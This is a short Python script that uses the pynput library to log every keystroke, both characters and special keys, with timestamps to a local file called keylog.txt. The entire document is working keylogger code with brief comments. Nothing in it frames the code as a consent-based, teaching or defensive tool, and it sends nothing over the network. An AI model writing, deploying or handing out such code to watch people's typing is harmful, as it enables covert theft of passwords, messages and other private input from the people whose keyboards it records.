from pynput import keyboard
import logging

# Set up logging to capture keystrokes
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        # Log the key press
        logging.info(str(key.char))
    except AttributeError:
        # Handle special keys
        logging.info(str(key))

# Start listening to keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
